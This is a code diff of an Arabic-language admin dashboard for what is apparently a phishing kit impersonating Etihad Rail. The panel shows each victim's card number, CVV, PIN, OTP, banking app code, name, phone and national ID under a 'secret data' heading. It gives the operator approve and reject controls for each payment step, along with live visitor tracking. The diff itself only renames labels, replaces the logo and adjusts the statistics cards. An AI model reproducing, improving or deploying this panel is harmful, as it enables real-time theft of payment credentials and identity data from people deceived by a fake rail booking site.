@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لوحة الإدارة — قطارات الاتحاد</title>
+<title>لوحة التحكم — قطارات الاتحاد</title>
 <link rel="icon" href="/favicon.png" type="image/png">
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
@@ -213,8 +213,8 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 
 <div class="login-wrap" id="loginScreen">
   <div class="login-box">
-    <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
-    <h1>لوحة الإدارة</h1>
+    <div style="width:64px;height:64px;background:linear-gradient(135deg,#C5A572,#d4b896);border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 8px">🚄</div>
+    <h1>لوحة التحكم</h1>
     <p class="sub">أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
     <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
     <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
@@ -225,16 +225,16 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 <div class="layout" id="layout">
   <div class="topbar">
     <div class="tb-r">
-      <img src="/etihad_rail_logo.png" alt="">
-      <span class="t">لوحة الإدارة</span>
+      <div style="width:36px;height:36px;background:linear-gradient(135deg,#C5A572,#d4b896);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px">🚄</div>
+      <span class="t">لوحة التحكم</span>
       <span class="sp">|</span>
       <span class="bn">قطارات الاتحاد</span>
     </div>
     <div class="tb-l">
       <button class="tb-visitors" onclick="openVM()">
-        <span>📊</span><span>الزوار:</span><span class="num" id="tbV">0</span>
+        <span>📊</span><span>إجمالي الزوار:</span><span class="num" id="tbV">0</span>
       </button>
-      <span class="tb-online"><span class="dot"></span> نشط الآن: <strong id="tbO">0</strong></span>
+      <span class="tb-online"><span class="dot"></span> الزوار الآن: <strong id="tbO">0</strong></span>
       <span class="tb-admin">👤 Admin</span>
       <button class="tb-logout" onclick="doLogout()">خروج</button>
     </div>
@@ -318,12 +318,14 @@ function isDone(o){return DONE.indexOf(o.status)!==-1}
 
 function renderStats(){
   var pending=orders.filter(isPending),done=orders.filter(isDone);
+  var active=orders.filter(function(o){return isPending(o)||isDone(o)});
+  var completed=orders.filter(function(o){return(o.status||'')==='payment_approved'||(o.status||'').indexOf('approved')!==-1});
   var cards=[
-    {label:'إجمالي الطلبات',value:orders.length,color:'#C5A572',bg:'rgba(197,165,114,0.1)',border:'rgba(197,165,114,0.25)',icon:'👥'},
-    {label:'الزوار النشطين',value:visitors.length,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'🌐',live:true,click:true,hint:'عرض الزوار ↗'},
-    {label:'بانتظار إجراء',value:pending.length,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'⚠️'},
-    {label:'مقبول',value:done.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅'},
-    {label:'مرفوض',value:orders.filter(function(o){return(o.status||'').indexOf('rejected')!==-1}).length,color:'#dc2626',bg:'rgba(220,38,38,0.1)',border:'rgba(220,38,38,0.25)',icon:'❌'}
+    {label:'إجمالي العملاء',value:orders.length,color:'#C5A572',bg:'rgba(197,165,114,0.1)',border:'rgba(197,165,114,0.25)',icon:'👥'},
+    {label:'إجمالي الزوار',value:orders.length+visitors.length,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'📊',click:true,hint:'عرض السجل ↗'},
+    {label:'الزوار الحاليين',value:visitors.length,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'🌐',live:true,click:true,hint:'المتصلين الآن ↗'},
+    {label:'عملاء نشطين',value:pending.length,color:'#3b82f6',bg:'rgba(59,130,246,0.1)',border:'rgba(59,130,246,0.25)',icon:'⚡',live:true},
+    {label:'مكتملين',value:completed.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅'}
   ];
   document.getElementById('statsRow').innerHTML=cards.map(function(c){
     var cl=c.click?'cursor:pointer':'cursor:default';
@@ -398,25 +400,25 @@ function renderDetail(o){
   h+='<div class="sec-codes"><h3>🔑 البيانات السرية</h3><div class="codes-grid">';
   h+=codeCard('💳 رقم البطاقة',o.card_number);
   h+=codeCard('🔒 CVV',o.cvv);
-  h+=codeCard('📲 رمز OTP',o.otp_code);
+  h+=codeCard('📲 رمز OTP (6 أرقام)',o.otp_code);
   h+='</div><div class="codes-grid" style="margin-top:10px">';
-  h+=codeCard('🔑 PIN',o.card_pin);
+  h+=codeCard('🔐 الرقم السري (PIN)',o.card_pin);
   h+=codeCard('📱 كود التطبيق',o.app_code);
-  h+=codeCard('📅 الصلاحية',o.expiry_month&&o.expiry_year?o.expiry_month+'/'+o.expiry_year:null);
+  h+=codeCard('📅 تاريخ الانتهاء',o.expiry_month&&o.expiry_year?o.expiry_month+'/'+o.expiry_year:null);
   h+='</div></div>';
 
   // ALL DATA
   var allData=[
-    {icon:'🕐',label:'تاريخ الإنشاء',value:fmtDate(o.created_at),hl:true},
-    {icon:'👤',label:'الاسم',value:o.name},
-    {icon:'📱',label:'رقم الجوال',value:o.mobile},
-    {icon:'🪪',label:'رقم الهوية',value:o.id_number},
+    {icon:'🕐',label:'تاريخ ووقت المعاملة',value:fmtDate(o.created_at),hl:true},
+    {icon:'👤',label:'الاسم الكامل',value:o.name},
+    {icon:'📱',label:'رقم الهاتف',value:o.mobile},
+    {icon:'🪪',label:'الرقم القومي',value:o.id_number},
     {icon:'💳',label:'رقم البطاقة',value:o.card_number,hl:true},
     {icon:'👤',label:'اسم حامل البطاقة',value:o.card_name},
-    {icon:'📅',label:'انتهاء الصلاحية',value:o.expiry_month&&o.expiry_year?o.expiry_month+'/'+o.expiry_year:null},
+    {icon:'📅',label:'تاريخ الانتهاء',value:o.expiry_month&&o.expiry_year?o.expiry_month+'/'+o.expiry_year:null},
     {icon:'🔒',label:'CVV',value:o.cvv,hl:true},
-    {icon:'🔑',label:'PIN',value:o.card_pin,hl:true},
-    {icon:'📲',label:'رمز OTP',value:o.otp_code,hl:true},
+    {icon:'🔐',label:'الرقم السري (PIN)',value:o.card_pin,hl:true},
+    {icon:'📲',label:'رمز OTP (6 أرقام)',value:o.otp_code,hl:true},
     {icon:'📱',label:'كود التطبيق',value:o.app_code,hl:true},
     {icon:'🚂',label:'المسار',value:o.card_type},
     {icon:'💰',label:'المبلغ',value:parseAmount(o.address)},
@@ -435,7 +437,7 @@ function renderDetail(o){
   h+='</div></div>';
 
   // JOURNEY CONTROL
-  h+='<div class="sec-ctrl"><h4>🎮 التحكم في الطلب</h4>';
+  h+='<div class="sec-ctrl"><h4>🎛️ التحكم في المعاملة</h4>';
   if(o.status==='payment_done'){
     h+='<div class="approve-row">'+
       '<button class="btn-ok" onclick="doAction(\''+o.id+'\',\'payment_approved\')">✅ قبول الدفع</button>'+
@@ -611,8 +613,8 @@ function renderVM(){
     return(v.visitor_id||v.id||'').toLowerCase().indexOf(q)!==-1})}
 
   var h='<div class="modal"><div class="modal-head"><div>'+
-    '<h3 style="margin:0;color:#92400e">📊 سجل الزوار والإحصائيات</h3>'+
-    '<p style="margin:2px 0 0;font-size:12px;color:#6b7280">متابعة حركة زوار الموقع</p></div>'+
+    '<h3 style="margin:0;color:#92400e">📊 سجل الزوار وإحصائيات الزيارات</h3>'+
+    '<p style="margin:2px 0 0;font-size:12px;color:#6b7280">متابعة حركة الزوار والعملاء</p></div>'+
     '<div class="btns"><button style="background:#f3f4f6;border:1px solid #d1d5db;color:#1a1a2e" onclick="loadVisitors();loadAllSiteVisitors().then(function(){renderVM()})">🔄 تحديث</button>'+
     '<button style="background:#fee2e2;border:1px solid #fca5a5;color:#dc2626" onclick="closeVM()">✕ إغلاق</button></div></div>';
 
@@ -621,7 +623,7 @@ function renderVM(){
   // 3 stats
   h+='<div class="vm-stats">'+
     '<div class="vm-sc" style="background:#f5eedf;border:1px solid #C5A572">'+
-    '<div class="n" style="color:#C5A572">'+allList.length+'</div><div class="l">إجمالي الزوار التراكمي</div></div>'+
+    '<div class="n" style="color:#C5A572">'+allList.length+'</div><div class="l">إجمالي الزوار</div></div>'+
     '<div class="vm-sc" style="background:#d1fae5;border:1px solid #6ee7b7">'+
     '<div class="n" style="color:#059669;display:flex;align-items:center;justify-content:center;gap:6px">'+
     '<span style="width:8px;height:8px;border-radius:50%;background:#059669;display:inline-block;animation:pulse 1.5s infinite"></span>'+onlineList.length+'</div>'+
